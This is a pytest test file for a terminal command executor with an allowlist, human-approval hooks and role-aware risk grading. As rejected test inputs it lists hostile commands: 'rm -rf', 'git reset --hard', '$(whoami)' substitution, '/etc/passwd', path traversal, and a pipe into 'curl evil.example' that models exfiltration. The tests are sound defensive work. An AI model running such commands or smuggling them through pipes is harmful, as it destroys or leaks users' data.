from __future__ import annotations

import pytest

import terminal as terminal_module
from command_policy import CommandAssessment, RiskLevel
from terminal import TerminalError, TerminalExecutor


def test_terminal_allows_common_read_only_command(tmp_path):
    executor = TerminalExecutor(tmp_path, timeout=2)
    result = executor.run(["python", "--version"])

    assert result.returncode == 0
    assert "Python" in (result.stdout + result.stderr)


@pytest.mark.parametrize(
    "command,error",
    [
        ([], "Empty command"),
        (["rm", "-rf", "x"], "forbidden"),
        (["git", "reset", "--hard"], "Subcommand"),
        (["python", "-c", "print(1)"], "Inline mode"),
        (["echo", "$(whoami)"], "Command substitution"),
        (["cat", "../secret"], "Path traversal"),
        (["echo", "/etc/passwd"], "Absolute paths"),
        (["sed", "-i", "s/a/b/", "file"], "In-place"),
    ],
)
def test_terminal_validation_rejects_dangerous_inputs(tmp_path, command, error):
    executor = TerminalExecutor(tmp_path)
    with pytest.raises(TerminalError, match=error):
        executor._validate(command)


# ── Pipe segment validation ─────────────────────────────────────────

def test_pipe_segments_each_validated_against_allowlist(tmp_path):
    """`allowed | forbidden` must not smuggle binaries past the allowlist."""
    executor = TerminalExecutor(tmp_path)
    with pytest.raises(TerminalError, match="not allowed"):
        executor._validate(["cat", "file.txt", "|", "curl", "evil.example"])
    with pytest.raises(TerminalError, match="forbidden"):
        executor._validate(["echo", "x", "|", "rm", "-rf", "dir"])
    with pytest.raises(TerminalError, match="not allowed"):
        executor._validate(["echo", "x", "|", "unknown-tool"])
    with pytest.raises(TerminalError, match="Subcommand"):
        executor._validate(["cat", "file.txt", "|", "git", "reset"])


def test_pipe_with_allowed_segments_passes_validation(tmp_path):
    executor = TerminalExecutor(tmp_path)
    executor._validate(["cat", "file.txt", "|", "grep", "needle"])


def test_pipe_empty_segment_rejected(tmp_path):
    executor = TerminalExecutor(tmp_path)
    with pytest.raises(TerminalError, match="Empty command segment"):
        executor._validate(["|", "grep", "x"])
    with pytest.raises(TerminalError, match="Empty command segment"):
        executor._validate(["cat", "file.txt", "|"])


# ── command_policy risk assessment in the run() path ────────────────

def test_run_uses_command_policy_and_denies_on_refusal(tmp_path, monkeypatch):
    """assess_command participates in run(); denied approval → denied result."""
    executor = TerminalExecutor(tmp_path)
    assessed: dict = {}

    def fake_assess(command, role="coder"):
        assessed["command"] = command
        assessed["role"] = role
        return CommandAssessment(
            command=command,
            risk=RiskLevel.DANGEROUS,
            reason="test-dangerous",
            requires_approval=True,
        )

    approvals: list = []

    def fake_approval(cls_command, reason):
        approvals.append((cls_command, reason))
        return False

    monkeypatch.setattr(terminal_module, "assess_command", fake_assess)
    monkeypatch.setattr(
        TerminalExecutor, "_request_user_approval", classmethod(lambda cls, c, r: fake_approval(c, r))
    )

    result = executor.run(["ls"], role="devops")

    assert assessed["command"] == ["ls"]
    assert assessed["role"] == "devops"
    assert approvals and "test-dangerous" in approvals[0][1]
    assert result.denied is True
    assert result.returncode == -1


def test_run_executes_safe_command_without_approval(tmp_path, monkeypatch):
    executor = TerminalExecutor(tmp_path)

    def forbid_approval(cls, command, reason):
        raise AssertionError("safe command must not trigger HITL approval")

    monkeypatch.setattr(TerminalExecutor, "_request_user_approval", classmethod(forbid_approval))
    result = executor.run(["echo", "hello"])

    assert result.returncode == 0
    assert "hello" in result.stdout


def test_assess_risk_is_role_aware_for_allowlisted_commands(tmp_path):
    """docker rm is allowlisted (docker: None) but risk-graded by role."""
    executor = TerminalExecutor(tmp_path)
    executor._validate(["docker", "rm", "container"])  # passes allowlist

    coder = executor._assess_risk(["docker", "rm", "container"], "coder")
    devops = executor._assess_risk(["docker", "rm", "container"], "devops")

    assert coder.requires_approval is True
    assert devops.requires_approval is False


def test_assess_risk_checks_every_pipe_segment(tmp_path):
    """`safe | dangerous` must be graded by the riskiest segment."""
    executor = TerminalExecutor(tmp_path)
    assessment = executor._assess_risk(["echo", "x", "|", "rm", "-rf", "dir"], "coder")

    assert assessment.risk is RiskLevel.DANGEROUS
    assert assessment.requires_approval is True


def test_terminal_restricted_profile_blocks_dev_tools(tmp_path):
    executor = TerminalExecutor(tmp_path, profile="restricted")
    with pytest.raises(TerminalError, match="forbidden"):
        executor._validate(["python", "--version"])


def test_terminal_resolves_cwd_inside_workspace_only(tmp_path):
    (tmp_path / "sub").mkdir()
    executor = TerminalExecutor(tmp_path)

    assert executor._resolve_cwd("sub") == (tmp_path / "sub").resolve()
    with pytest.raises(TerminalError, match="outside workspace|Absolute paths"):
        executor._resolve_cwd("../outside")


def test_terminal_clamps_timeout_and_truncates_output(tmp_path):
    executor = TerminalExecutor(tmp_path, timeout=99, max_output_chars=1000)
    assert executor.timeout == 30.0
    assert executor._clamp_timeout(0.1) == 1.0
    assert executor._clamp_timeout(99) == 30.0
    assert "[TRUNCATED" in executor._truncate("x" * 1001)


# ── DevOps systemctl allowlist ──────────────────────────────────────

def test_systemctl_status_allowed_in_dev_profile(tmp_path):
    """systemctl status nginx --no-pager passes terminal validation."""
    executor = TerminalExecutor(tmp_path, profile="dev")
    # Must not raise TerminalError
    executor._validate(["systemctl", "status", "nginx", "--no-pager"])


def test_systemctl_is_active_allowed(tmp_path):
    """systemctl is-active nginx passes terminal validation."""
    executor = TerminalExecutor(tmp_path, profile="dev")
    executor._validate(["systemctl", "is-active", "nginx"])


def test_systemctl_is_enabled_allowed(tmp_path):
    """systemctl is-enabled nginx passes terminal validation."""
    executor = TerminalExecutor(tmp_path, profile="dev")
    executor._validate(["systemctl", "is-enabled", "nginx"])


def test_systemctl_list_units_allowed(tmp_path):
    """systemctl list-units --type=service passes terminal validation."""
    executor = TerminalExecutor(tmp_path, profile="dev")
    executor._validate(["systemctl", "list-units", "--type=service"])


def test_systemctl_list_unit_files_allowed(tmp_path):
    """systemctl list-unit-files nginx.service passes terminal validation."""
    executor = TerminalExecutor(tmp_path, profile="dev")
    executor._validate(["systemctl", "list-unit-files", "nginx.service"])


@pytest.mark.parametrize(
    "command",
    [
        ["systemctl", "start", "nginx"],
        ["systemctl", "stop", "nginx"],
        ["systemctl", "restart", "nginx"],
        ["systemctl", "reload", "nginx"],
        ["systemctl", "enable", "nginx"],
        ["systemctl", "disable", "nginx"],
        ["systemctl", "daemon-reload"],
        ["systemctl", "mask", "nginx"],
    ],
)
def test_systemctl_dangerous_subcommands_blocked(tmp_path, command):
    """Dangerous systemctl subcommands are blocked by subcommand validator."""
    executor = TerminalExecutor(tmp_path, profile="dev")
    with pytest.raises(TerminalError, match="Subcommand"):
        executor._validate(command)


def test_systemctl_blocked_in_restricted_profile(tmp_path):
    """systemctl is NOT available in restricted profile (dev tools not loaded)."""
    executor = TerminalExecutor(tmp_path, profile="restricted")
    with pytest.raises(TerminalError, match="not allowed"):
        executor._validate(["systemctl", "status", "nginx", "--no-pager"])
